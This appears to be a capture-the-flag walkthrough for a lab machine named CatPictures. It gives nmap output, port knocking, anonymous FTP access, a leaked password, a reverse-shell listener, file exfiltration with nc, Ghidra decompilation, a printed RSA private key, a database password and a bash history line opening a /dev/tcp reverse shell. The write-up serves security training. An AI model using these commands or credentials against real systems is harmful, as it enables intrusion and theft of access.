@@ -1,0 +1,574 @@
+CatPictures
+
+
+## IN FIRST NMAP RESULTS 
+-----------------------------
+(WE GOT ONLY 3 PORTS OPEN!!)
+
+Nmap scan report for 10.10.197.23
+Host is up, received echo-reply ttl 63 (0.16s latency).
+Scanned at 2021-06-05 05:05:19 EDT for 92s
+
+PORT     STATE SERVICE      REASON         VERSION
+22/tcp   open  ssh          syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIDEV5ShmazmTw/1A6+19Bz9t3Aa669UOdJ6wf+mcv3vvJmh6gC8V8J58nisEufW0xnT69hRkbqrRbASQ8IrvNS8vNURpaA0cycHDntKA17ukX0HMO7AS6X8uHfIFZwTck5v6tLAyHlgBh21S+wOEqnANSms64VcSUma7fgUCKeyJd5lnDuQ9gCnvWh4VxSNoW8MdV64sOVLkyuwd0FUTiGctjTMyt0dYqIUnTkMgDLRB77faZnMq768R2x6bWWb98taMT93FKIfjTjGHV/bYsd/K+M6an6608wMbMbWz0pa0pB5Y9k4soznGUPO7mFa0n64w6ywS7wctcKngNVg3H
+|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCs+ZcCT7Bj2uaY3QWJFO4+e3ndWR1cDquYmCNAcfOTH4L7lBiq1VbJ7Pr7XO921FXWL05bAtlvY1sqcQT6W43Y=
+|   256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq9I/445X/oJstLHIcIruYVdW4KqIFZks9fygfPkkPq
+4420/tcp open  nvm-express? syn-ack ttl 63
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
+|     INTERNAL SHELL SERVICE
+|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
+|     ctrl-c
+|     Please enter password:
+|     Invalid password...
+|     Connection Closed
+|   NULL, RPCCheck: 
+|     INTERNAL SHELL SERVICE
+|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
+|     ctrl-c
+|_    Please enter password:
+8080/tcp open  http         syn-ack ttl 62 Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
+|_http-title: Cat Pictures - Index page
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port4420-TCP:V=7.91%I=7%D=6/5%Time=60BB3E56%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,A0,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x
+SF:20do\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are
+SF:\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\n
+SF:Please\x20enter\x20password:\n")%r(GenericLines,C6,"INTERNAL\x20SHELL\x
+SF:20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at
+SF:\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x2
+SF:0the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20passwo
+SF:rd:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(GetRequest,C
+SF:6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20d
+SF:o\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\x2
+SF:0fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPle
+SF:ase\x20enter\x20password:\nInvalid\x20password\.\.\.\nConnection\x20Clo
+SF:sed\n")%r(HTTPOptions,C6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:
+SF:\x20cd\x20commands\x20do\x20not\x20work\x20at\x20the\x20moment,\x20the\
+SF:x20developers\x20are\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20no
+SF:t\x20use\x20ctrl-c\nPlease\x20enter\x20password:\nInvalid\x20password\.
+SF:\.\.\nConnection\x20Closed\n")%r(RTSPRequest,C6,"INTERNAL\x20SHELL\x20S
+SF:ERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at\x2
+SF:0the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x20th
+SF:e\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20password:
+SF:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(RPCCheck,A0,"IN
+SF:TERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20
+SF:not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\x20fixi
+SF:ng\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x
+SF:20enter\x20password:\n")%r(DNSVersionBindReqTCP,C6,"INTERNAL\x20SHELL\x
+SF:20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at
+SF:\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x2
+SF:0the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20passwo
+SF:rd:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.91%E=4%D=6/5%OT=22%CT=%CU=37254%PV=Y%DS=2%DC=T%G=N%TM=60BB3EAB%P=x86_64-pc-linux-gnu)
+SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
+OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)
+WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
+ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)
+T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
+IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 7.200 days (since Sat May 29 00:18:48 2021)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 22/tcp)
+HOP RTT       ADDRESS
+1   159.96 ms 10.8.0.1
+2   161.13 ms 10.10.197.23
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 05:06
+Completed NSE at 05:06, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 05:06
+Completed NSE at 05:06, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 05:06
+Completed NSE at 05:06, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 93.42 seconds
+           Raw packets sent: 65 (4.504KB) | Rcvd: 47 (3.404KB)
+
+
+
+## CHECKING THE PORT 8080, I GOT A POST WHICH IS A POST:
+------------------------------------------------------------
+
+ Post cat pictures here!
+
+Post by user » Wed Mar 24, 2021 8:33 pm
+POST ALL YOUR CAT PICTURES HERE :)
+
+Knock knock! Magic numbers: 1111, 2222, 3333, 4444
+Top
+
+## WE HAVE TO DO SOME PORT KNOCKING ON THESE PORTS, SO LETS MAKE A ONE-LINER:
+--------------------------------------------------------------------------------
+
+# for i in 1111,2222,3333,4444; do nmap -Pn -p$i --host-timeout 201 --max-retries 0 10.10.197.23; done
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-05 05:09 EDT
+Nmap scan report for 10.10.197.23
+Host is up (0.16s latency).
+
+PORT     STATE  SERVICE
+1111/tcp closed lmsocialserver
+2222/tcp closed EtherNetIP-1
+3333/tcp closed dec-notes
+4444/tcp closed krb524
+
+
+## LETS AGAIN DO A NMAP SCAN:
+---------------------------------
+(THIS TIME WE GOT PORT 21 IS OPEN WITH ANONYMOUS LOGIN!!)
+
+
+Nmap scan report for 10.10.197.23
+Host is up, received reset ttl 63 (0.16s latency).
+Scanned at 2021-06-05 05:10:48 EDT for 91s
+
+PORT     STATE SERVICE      REASON         VERSION
+21/tcp   open  ftp          syn-ack ttl 63 vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 ftp      ftp           162 Apr 02 14:32 note.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.73.218
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh          syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIDEV5ShmazmTw/1A6+19Bz9t3Aa669UOdJ6wf+mcv3vvJmh6gC8V8J58nisEufW0xnT69hRkbqrRbASQ8IrvNS8vNURpaA0cycHDntKA17ukX0HMO7AS6X8uHfIFZwTck5v6tLAyHlgBh21S+wOEqnANSms64VcSUma7fgUCKeyJd5lnDuQ9gCnvWh4VxSNoW8MdV64sOVLkyuwd0FUTiGctjTMyt0dYqIUnTkMgDLRB77faZnMq768R2x6bWWb98taMT93FKIfjTjGHV/bYsd/K+M6an6608wMbMbWz0pa0pB5Y9k4soznGUPO7mFa0n64w6ywS7wctcKngNVg3H
+|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCs+ZcCT7Bj2uaY3QWJFO4+e3ndWR1cDquYmCNAcfOTH4L7lBiq1VbJ7Pr7XO921FXWL05bAtlvY1sqcQT6W43Y=
+|   256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq9I/445X/oJstLHIcIruYVdW4KqIFZks9fygfPkkPq
+4420/tcp open  nvm-express? syn-ack ttl 63
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
+|     INTERNAL SHELL SERVICE
+|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
+|     ctrl-c
+|     Please enter password:
+|     Invalid password...
+|     Connection Closed
+|   NULL, RPCCheck: 
+|     INTERNAL SHELL SERVICE
+|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
+|     ctrl-c
+|_    Please enter password:
+8080/tcp open  http         syn-ack ttl 62 Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
+|_http-title: Cat Pictures - Index page
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port4420-TCP:V=7.91%I=7%D=6/5%Time=60BB3F9F%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,A0,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x
+SF:20do\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are
+SF:\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\n
+SF:Please\x20enter\x20password:\n")%r(GenericLines,C6,"INTERNAL\x20SHELL\x
+SF:20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at
+SF:\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x2
+SF:0the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20passwo
+SF:rd:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(GetRequest,C
+SF:6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20d
+SF:o\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\x2
+SF:0fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPle
+SF:ase\x20enter\x20password:\nInvalid\x20password\.\.\.\nConnection\x20Clo
+SF:sed\n")%r(HTTPOptions,C6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:
+SF:\x20cd\x20commands\x20do\x20not\x20work\x20at\x20the\x20moment,\x20the\
+SF:x20developers\x20are\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20no
+SF:t\x20use\x20ctrl-c\nPlease\x20enter\x20password:\nInvalid\x20password\.
+SF:\.\.\nConnection\x20Closed\n")%r(RTSPRequest,C6,"INTERNAL\x20SHELL\x20S
+SF:ERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at\x2
+SF:0the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x20th
+SF:e\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20password:
+SF:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(RPCCheck,A0,"IN
+SF:TERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20
+SF:not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\x20fixi
+SF:ng\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x
+SF:20enter\x20password:\n")%r(DNSVersionBindReqTCP,C6,"INTERNAL\x20SHELL\x
+SF:20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at
+SF:\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x2
+SF:0the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20passwo
+SF:rd:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.91%E=4%D=6/5%OT=21%CT=%CU=42786%PV=Y%DS=2%DC=T%G=N%TM=60BB3FF3%P=x86_64-pc-linux-gnu)
+SEQ(SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
+OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)
+WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
+ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)
+T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
+IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 7.204 days (since Sat May 29 00:18:49 2021)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=259 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT       ADDRESS
+1   160.17 ms 10.8.0.1
+2   160.45 ms 10.10.197.23
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 05:12
+Completed NSE at 05:12, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 05:12
+Completed NSE at 05:12, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 05:12
+Completed NSE at 05:12, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 92.12 seconds
+           Raw packets sent: 64 (4.428KB) | Rcvd: 45 (3.240KB)
+
+
+
+## AFTER LOGIN INTO FTP SHARES:
+-------------------------------------
+
+# ftp 10.10.197.23
+Connected to 10.10.197.23.
+220 (vsFTPd 3.0.3)
+Name (10.10.197.23:root): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp           162 Apr 02 14:32 note.txt
+226 Directory send OK.
+ftp> mget *
+mget note.txt? y
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note.txt (162 bytes).
+226 Transfer complete.
+162 bytes received in 0.00 secs (59.2743 kB/s)
+ftp> 
+
+
+## LETS CHECK THE CONTENTS OF THIS FILE:
+--------------------------------------------
+
+In case I forget my password, I'm leaving a pointer to the internal shell service on the server.
+
+Connect to port 4420, the password is sardinethecat.
+- catlover
+
+
+## HMMM...LETS TRY THESE CREDS ON PORT 4420
+---------------------------------------------
+
+# nc 10.10.197.23 4420
+INTERNAL SHELL SERVICE
+please note: cd commands do not work at the moment, the developers are fixing it at the moment.
+do not use ctrl-c
+Please enter password:
+sardinethecat
+Password accepted
+
+id
+/bin/sh: 1: id: not found
+whoami
+/bin/sh: 1: whoami: not found
+
+
+## WE GOT INTO A SHELL, BUT I THINK IT IS A RESTRICTED SHELL
+
+## AS WE KNOW THAT 'cd' COMMAND IS NOT WORKING WE HAVE TO USE 'ls' COMMNAND TO ENUMERATE THE DIRECTORIES
+
+## IN THEE /HOME DIRECTORY, INTO THE 'CATLOVER' USER, I FOUND A 'ELF BINARY' NAMES "RUNME":
+-----------------------------------------------------------------------------------------------
+
+ls -la /home
+total 12
+drwxr-xr-x  3    0    0 4096 Apr  2 20:51 .
+drwxr-xr-x 10 1001 1001 4096 Apr  3 01:30 ..
+drwxr-xr-x  2    0    0 4096 Apr  3 01:34 catlover
+    
+ls -la /home/catlover
+total 28
+drwxr-xr-x 2 0 0  4096 Apr  3 01:34 .
+drwxr-xr-x 3 0 0  4096 Apr  2 20:51 ..
+-rwxr-xr-x 1 0 0 18856 Apr  3 01:35 runme
+
+ls -la /home/catlover/runme
+THIS EXECUTABLE DOES NOT WORK UNDER THE INTERNAL SHELL, YOU NEED A REGULAR SHELL.
+
+
+## SO HAVE TO GAIN A PROPER SHELL TO RUN THIS BINARY
+## LETS TRY TO GET A REVERSE SHELL, MAYBE THIS SOLVES OUR PROBLEM?
+-----------------------------------------------------------------------
+
+# nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.197.23] 54148
+bash: cannot set terminal process group (1575): Inappropriate ioctl for device
+bash: no job control in this shell
+I have no name!@cat-pictures:/# 
+
+
+## UNFORTUNETELY, NO
+## WE HAVE ONLY LIMITED NUMBER OF COMMNANDS TO RUN
+
+## FIRST I SET THE "HOME" ENV VARIABLE WHICH MAKES "CD" COMMAND RUN:
+------------------------------------------------------------------------
+
+I have no name!@cat-pictures:/# cd 
+cd 
+bash: cd: HOME not set
+I have no name!@cat-pictures:/# export HOME=/    
+export HOME=/
+I have no name!@cat-pictures:/# export HOME=/$HOME
+export HOME=/$HOME
+I have no name!@cat-pictures:/# cd
+cd
+I have no name!@cat-pictures:~# cd /home/catlover
+cd /home/catlover
+I have no name!@cat-pictures:/home/catlover# ls -la
+
+## NOW WE KNOW THAT WE HAVE "NC" AVAILABLE ON THE REMOTE MACHINE SO I TRANSFER THE "RUNME" FILE TO MY MACHINE USING NC:
+---------------------------------------------------------------------------------------------------------------------------
+
+(LOCAL MACHINE)
+# nc -nvlp 4444 > runme
+listening on [any] 4444 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.197.23] 50464
+
+(REMOTE MACHINE)
+I have no name!@cat-pictures:/home/catlover# cat runme | nc 10.8.73.218 4444
+cat runme | nc 10.8.73.218 4444
+
+(YOU HAVE TO STOP THE PROCESS MANUALLY BY PRESSING CTRL+C)
+
+## LETS RUN THE BINARY:
+------------------------
+
+# ./runme 
+Please enter yout password: sardinethecat
+Access Denied
+
+(THIS PASSWORD IS NOT WORKING)
+
+## I JUST STRING THE OUTPUT AND CAREFULLY LOOK ALL THE STRINGS AND USE SOME OF THEM WHICH CAN BE PASSWORD:
+-----------------------------------------------------------------------------------------------------------
+
+# ./runme 
+Please enter yout password: rebecca
+Welcome, catlover! SSH key transfer queued! 
+
+## YESH!! WE GOT IT
+
+## AND IN GHIDRA, I CHECK THE TRUE CONDITION:
+----------------------------------------------
+
+  else {
+    pbVar2 = std::operator<<((basic_ostream *)std::cout,
+                             "Welcome, catlover! SSH key transfer queued! ");
+    std::basic_ostream<char,std::char_traits<char>>::operator<<
+              ((basic_ostream<char,std::char_traits<char>> *)pbVar2,
+               std::endl<char,std::char_traits<char>>);
+    system("touch /tmp/gibmethesshkey");
+  }
+
+
+  ## WHEN THE CONDITON IS TRUE , IT IS JUST CREATING AN EMPTY FILE 
+
+  ## BUT WHEN YOU CHECK YOUR HOME DIRECTORY YOU GET THE PRIVATE SSH KEY:
+  -------------------------------------------------------------------------
+
+  I have no name!@cat-pictures:/home/catlover# cat id_rsa
+cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAmI1dCzfMF4y+TG3QcyaN3B7pLVMzPqQ1fSQ2J9jKzYxWArW5
+IWnCNvY8gOZdOSWgDODCj8mOssL7SIIgkOuD1OzM0cMBSCCwYlaN9F8zmz6UJX+k
+jSmQqh7eqtXuAvOkadRoFlyog2kZ1Gb72zebR75UCBzCKv1zODRx2zLgFyGu0k2u
+xCa4zmBdm80X0gKbk5MTgM4/l8U3DFZgSg45v+2uM3aoqbhSNu/nXRNFyR/Wb10H
+tzeTEJeqIrjbAwcOZzPhISo6fuUVNH0pLQOf/9B1ojI3/jhJ+zE6MB0m77iE07cr
+lT5PuxlcjbItlEF9tjqudycnFRlGAKG6uU8/8wIDAQABAoIBAH1NyDo5p6tEUN8o
+aErdRTKkNTWknHf8m27h+pW6TcKOXeu15o3ad8t7cHEUR0h0bkWFrGo8zbhpzcte
+D2/Z85xGsWouufPL3fW4ULuEIziGK1utv7SvioMh/hXmyKymActny+NqUoQ2JSBB
+QuhqgWJppE5RiO+U5ToqYccBv+1e2bO9P+agWe+3hpjWtiAUHEdorlJK9D+zpw8s
+/+9CjpDzjXA45X2ikZ1AhWNLhPBnH3CpIgug8WIxY9fMbmU8BInA8M4LUvQq5A63
+zvWWtuh5bTkj622QQc0Eq1bJ0bfUkQRD33sqRVUUBE9r+YvKxHAOrhkZHsvwWhK/
+oylx3WECgYEAyFR+lUqnQs9BwrpS/A0SjbTToOPiCICzdjW9XPOxKy/+8Pvn7gLv
+00j5NVv6c0zmHJRCG+wELOVSfRYv7z88V+mJ302Bhf6uuPd9Xu96d8Kr3+iMGoqp
+tK7/3m4FjoiNCpZbQw9VHcZvkq1ET6qdzU+1I894YLVu258KeCVUqIMCgYEAwvHy
+QTo6VdMOdoINzdcCCcrFCDcswYXxQ5SpI4qMpHniizoa3oQRHO5miPlAKNytw5PQ
+zSKoIW47AObP2twzVAH7d+PWRzqAGZXW8gsF6Ls48LxSJGzz8V191PjbcGQO7Oro
+Em8pQ+qCISxv3A8fKvG5E9xOspD0/3lsM/zGD9ECgYBOTgDAuFKS4dKRnCUt0qpK
+68DBJfJHYo9DiJQBTlwVRoh/h+fLeChoTSDkQ5StFwTnbOg+Y83qAqVwsYiBGxWq
+Q2YZ/ADB8KA5OrwtrKwRPe3S8uI4ybS2JKVtO1I+uY9v8P+xQcACiHs6OTH3dfiC
+tUJXwhQKsUCo5gzAk874owKBgC/xvTjZjztIWwg+WBLFzFSIMAkjOLinrnyGdUqu
+aoSRDWxcb/tF08efwkvxsRvbmki9c97fpSYDrDM+kOQsv9rrWeNUf4CpHJQuS9zf
+ZSal1Q0v46vdt+kmqynTwnRTx2/xHf5apHV1mWd7PE+M0IeJR5Fg32H/UKH8ROZM
+RpHhAoGAehljGmhge+i0EPtcok8zJe+qpcV2SkLRi7kJZ2LaR97QAmCCsH5SndzR
+tDjVbkh5BX0cYtxDnfAF3ErDU15jP8+27pEO5xQNYExxf1y7kxB6Mh9JYJlq0aDt
+O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ=
+-----END RSA PRIVATE KEY-----
+
+
+## LETS TRY TO SSH INTO THE USER(MAYBE THE USERNAME IS CATLOVER?)
+---------------------------------------------------------------------
+
+# ssh -i id_rsa catlover@10.10.197.23
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)
+
+--[SNIP]--
+
+52 updates can be applied immediately.
+25 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+New release '20.04.2 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+Last login: Fri Jun  4 14:40:35 2021
+root@7546fa2336d6:/#
+-------------------------------------------------------------------
+
+## YES WE ARE IN, BUT I THINK MAYBE WE ARE IN A DOCKER CONTAINER?
+
+-rwxr-xr-x   1 root root    0 Mar 25 16:08 .dockerenv
+
+## YES IM RIGHT!
+
+## GOT THE "FLAG ONE" IN /ROOT FOLDER
+
+
+## FOUND SOME CREDS:
+---------------------
+
+root@7546fa2336d6:/opt/bitnami/phpbb# cat config.php 
+<?php
+// phpBB 3.3.x auto-generated configuration file
+// Do not change anything in this file!
+$dbms = 'phpbb\\db\\driver\\mysqli';
+$dbhost = 'mariadb';
+$dbport = '3306';
+$dbname = 'bitnami_phpbb';
+$dbuser = 'bn_phpbb';
+$dbpasswd = 'P@ssword';
+$table_prefix = 'phpbb_';
+$phpbb_adm_relative_path = 'adm/';
+$acm_type = 'phpbb\\cache\\driver\\file';
+
+
+## RUNNING LINPEAS:
+-----------------------
+
+I CHECK THE IP ADDRESS OF OUR MACHINE: 
+172.18.0.3	7546fa2336d6
+
+I ALSO CHECK THE NEIGHBOURING MACHINE: 
+IP address       HW type     Flags       HW address            Mask     Device
+172.18.0.2       0x1         0x2         02:42:ac:12:00:02     *        eth0
+172.18.0.1       0x1         0x2         02:42:b7:83:17:1a     *        eth0
+
+
+## I CHECK THE ".BASH_HISTORY" FILE IN / DIRECTORY:
+-----------------------------------------------------
+cat /post-init.sh 
+cat /opt/clean/clean.sh 
+bash -i >&/dev/tcp/192.168.4.20/4444 <&1
+nano /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
